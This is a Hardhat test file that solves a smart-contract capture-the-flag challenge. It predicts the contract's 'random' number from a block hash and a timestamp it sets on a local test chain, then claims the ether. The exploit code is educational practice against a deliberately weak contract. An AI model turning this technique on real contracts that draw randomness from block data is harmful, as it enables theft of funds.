import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract, BigNumber } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheNewNumberChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    // Deploy the challenge contract with exactly 1 ether.
    target = await (
      await ethers.getContractFactory('GuessTheNewNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });
    await target.deployed();

    // Connect using the attacker account.
    target = target.connect(attacker);
  });

  it('exploit', async () => {
    // Step 1: Get the latest block 
    const latestBlock = await provider.getBlock("latest");
    console.log("Latest Block:", latestBlock.number, "Timestamp:", latestBlock.timestamp);

    // Step 2: Mine a controlled block (Block B) with a known timestamp.
    // Block B will be used as the previous block in the guess function.
    const controlledTimestampB = latestBlock.timestamp + 100;
    await network.provider.send("evm_setNextBlockTimestamp", [controlledTimestampB]);
    await network.provider.send("evm_mine");
    const blockB = await provider.getBlock("latest");
    console.log("Controlled Block B:", blockB.number, "Timestamp:", blockB.timestamp, "Hash:", blockB.hash);

    // Step 3: Set the next block’s timestamp for the guess transaction (Block C).
    const controlledTimestampC = blockB.timestamp + 100;
    await network.provider.send("evm_setNextBlockTimestamp", [controlledTimestampC]);

    // Now, when the guess transaction is mined, it will be in Block C.
    // The contract will compute:
    //    answer = uint8(keccak256(BlockB.hash, BlockC.timestamp))
    const hash = utils.solidityKeccak256(
      ['bytes32', 'uint256'],
      [blockB.hash, controlledTimestampC]
    );
    
    const lastByteHex = ethers.utils.hexDataSlice(hash, 31, 32);
    const guessInt = parseInt(lastByteHex, 16);
    console.log("guessInt",guessInt);

    // Step 4: Call the guess function. The transaction will be mined in Block C with the controlled timestamp.
    const tx = await target.guess(guessInt, { value: utils.parseEther('1') });
    await tx.wait();

    expect(await target.isComplete()).to.equal(true);
  });
});
